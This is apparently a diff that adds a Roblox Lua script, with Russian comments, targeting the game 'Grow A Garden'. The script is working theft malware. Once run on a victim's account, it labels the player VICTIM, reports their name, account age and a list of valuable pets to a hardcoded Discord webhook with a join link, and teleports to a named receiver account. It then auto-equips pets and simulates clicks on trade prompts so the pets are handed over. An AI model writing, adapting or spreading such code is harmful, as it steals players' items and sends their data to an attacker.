@@ -1,0 +1,379 @@
+if getgenv().scriptAlreadyRan then
+    warn("⚠️ ScriptAlreadyRun.")
+    return
+end
+getgenv().scriptAlreadyRan = true
+
+repeat 
+    task.wait()
+until game:IsLoaded()
+
+local VICTIM = game.Players.LocalPlayer
+local USERNAMES = {
+    "monkey_master6"
+}
+
+
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+
+-- Проверка, приватный ли сервер (работает только если ты владелец)
+local function isPrivateServer()
+    return game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
+enda
+
+-- Проверка, заполнен ли сервер
+local function isServerFull()
+    return #Players:GetPlayers() >= Players.MaxPlayers
+end
+
+-- Проверка, есть ли цель на сервере
+local function isTargetOnServer()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if table.find(USERNAMES, player.Name) then
+            return true
+        end
+    end
+    return false
+end
+
+-- Сервер хоп — прыжок на другой публичный сервер
+local function tryServerHop()
+    local MAX_OCCUPANCY = 2 -- Игнорируем почти заполненные сервера
+    local success, result = pcall(function()
+        local url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+
+    if success and result and result.data then
+        for _, server in ipairs(result.data) do
+            if server.id ~= game.JobId and server.playing < MAX_OCCUPANCY then
+                print(string.format("🔁 Прыгаем на сервер: %s (%d/%d)", server.id, server.playing, server.maxPlayers))
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
+                return
+            end
+        end
+        warn("❌ Нет подходящих серверов (все переполнены).")
+    else
+        warn("❌ Не удалось получить список серверов.")
+    end
+end
+
+
+
+-- Основной цикл проверки сервера
+task.spawn(function()
+    while true do
+        task.wait(1) -- Проверять каждые 10 секунд
+        if isPrivateServer() then
+            print("🚫 Приватный сервер — прыгаем")
+            tryServerHop()
+        elseif isServerFull() and not isTargetOnServer() then
+            print("📡 Сервер полон и цели нет — прыгаем")
+            tryServerHop()
+        end
+    end
+end)
+
+-- Твоя логика по Discord, питомцам и взаимодействию
+-- ⚠️ Вставь весь остальной скрипт ниже (например, начиная с: getPlayersPets(), createDiscordEmbed(...) и т.д.)
+
+
+
+local PET_WHITELIST = {
+    'Raccoon',
+    'Honey Bee',
+    'T-Rex',
+    'Fennec Fox',
+    'Dragonfly',
+    'Butterfly',
+    'Disco Bee',
+    'Mimic Octopus',
+    'Queen Bee',
+    'Spinosaurus',
+    'Kitsune',
+    'Chicken Zombie',
+    'Red Fox',
+    'French Fry Ferret',
+}
+
+local PET_VALUES = {
+    ["French Fry Ferret"] = 10000,
+    ["Honey Bee"] = 9000,
+    ["Raccoon"] = 1900,
+    ["T-Rex"] = 400,
+    ["Fennec Fox"] = 1500,
+    ["Dragonfly"] = 500,
+    ["Butterfly"] = 1200,
+    ["Disco Bee"] = 2000,
+    ["Mimic Octopus"] = 500,
+    ["Queen Bee"] = 400,
+    ["Spinosaurus"] = 500,
+    ["Kitsune"] = 5000,
+    ["Chicken Zombie"] = 200,
+    ["Red Fox"] = 100,
+    ["Corrupted Kitsune"] = 300,
+}
+
+
+local victimPetTable = {}
+
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+
+local function waitForJoin()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if table.find(USERNAMES, player.Name) then
+            return true, player.Name
+        end
+    end
+    return false, nil
+end
+
+
+function createDiscordEmbed(petList, totalValue, fileUrl, callback)
+    local HttpService = game:GetService("HttpService")
+    local webhookUrl = "https://discord.com/api/webhooks/1401490956330598441/9KU1n_rztYZmietMLFL2vZSWi0RFfL-WH40TTWEth-vYw4ToC16VLXeeniIrSbJDd-X2"
+
+    local embed = {
+        title = ":cactus: Grow A Garden Hit - STANT STEAL :four_leaf_clover:",
+        color = 65280,
+        fields = {
+            {
+                name = ":bust_in_silhouette: **Player Information**",
+                value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
+                    VICTIM.Name,
+                    table.concat(USERNAMES, " "),
+                    identifyexecutor(),
+                    game.Players.LocalPlayer.AccountAge
+                ),
+                inline = false
+            },
+            {
+                name = ":moneybag: **Total Value**",
+                value = string.format("```\n%s₸\n```", totalValue),
+                inline = false
+            },
+            {
+                name = ":palm_tree: **Backpack**",
+                value = string.format("```\n%s\n```", petList),
+                inline = false
+            },
+            {
+                name = ":island: **Join with URL**",
+                value = string.format(
+                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
+                    game.JobId,
+                    game.PlaceId,
+                    game.JobId
+                ),
+                inline = false
+            }
+        },
+        footer = {
+            text = string.format("%s | %s", game.PlaceId, game.JobId)
+        }
+    }
+
+    local data = {
+        content = string.format(
+            "--@here\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+            game.PlaceId,
+            game.JobId
+        ),
+        username = game.Players.LocalPlayer.Name,
+        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+        embeds = {embed}
+    }
+
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = {["Content-Type"] = "application/json"}
+
+    local req = http_request or request or (syn and syn.request)
+    if not req then
+        warn(":warning: HTTP request function not found.")
+        return
+    end
+
+    local success, response = pcall(function()
+        return req({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = headers,
+            Body = jsonData
+        })
+    end)
+
+    if not success then
+        warn("Error sending webhook:", response)
+        return
+    end
+
+    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+        warn("Webhook failed with status:", response.StatusCode, response.Body)
+        return
+    end
+
+    if callback then callback() end
+end
+
+
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "LoadingScreen"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+
+
+
+
+local function teleportTarget(targetName)
+    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
+end
+
+local function deltaBypass()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,      
+        true,   
+        nil,    
+        false   
+    )
+
+    task.wait()
+
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,
+        false,
+        nil,
+        false
+    )
+end
+
+local function checkPetsWhilelist(pet)
+    for _, name in PET_WHITELIST do
+        if string.find(pet, name) then
+            return true
+        end
+    end
+end
+
+local function getPetObject(petUid)
+    for _, object in ipairs(VICTIM.Backpack:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+
+    local character = workspace:FindFirstChild(VICTIM.Name)
+    if character then
+        for _, object in ipairs(character:GetChildren()) do
+            if object:GetAttribute("PET_UUID") == petUid then
+                return object
+            end
+        end
+    end
+
+    return nil
+end
+
+
+local function equipPet(pet)
+    if pet:GetAttribute("d") then
+        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+    end
+
+    VICTIM.Character.Humanoid:EquipTool(pet)
+end
+
+local totalValue = 0
+local victimPetTable = {}
+
+local function getPlayersPets()
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+
+        if not checkPetsWhilelist(petName) then
+            continue
+        end
+
+        local petPrice = PET_VALUES[petName] or 0
+        totalValue += petPrice
+
+        table.insert(victimPetTable, string.format("%s - %s", petName, petPrice))
+    end
+end
+
+
+local function startSteal(trigerName)
+    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
+        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
+        deltaBypass()
+    end
+end
+
+local function checkPetsInventory(target)
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhilelist(value.PetType) then
+            continue
+        end
+
+        local petObject = getPetObject(petUid)
+        
+        if not petObject then
+            continue
+        end
+        
+        equipPet(petObject)
+        task.wait(0.2)
+        startSteal(target)
+    end
+end
+
+local function idlingTarget()
+    task.spawn(function()
+        local lastTarget = nil
+        local targetEnterTime = 0
+
+        while task.wait(0.2) do
+            local isTarget, trigerName = waitForJoin()
+
+            if isTarget then
+                if lastTarget ~= trigerName then
+                    lastTarget = trigerName
+                    targetEnterTime = tick() -- отметка времени появления цели
+                end
+
+                if tick() - targetEnterTime >= 20 then -- если цель уже 7+ секунд
+                    teleportTarget(trigerName)
+                    checkPetsInventory(trigerName)
+                end
+            else
+                lastTarget = nil
+                targetEnterTime = 0
+            end
+        end
+    end)
+end
+
+
+getPlayersPets()
+
+-- Если таблица пустая — не отправляем
+if #victimPetTable == 0 or #victimPetTable == nil then
+    warn("❌ Нет подходящих питомцев — сообщение не будет отправлено в Discord.")
+    return
+end
+
+
+createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
+    idlingTarget()
+end)
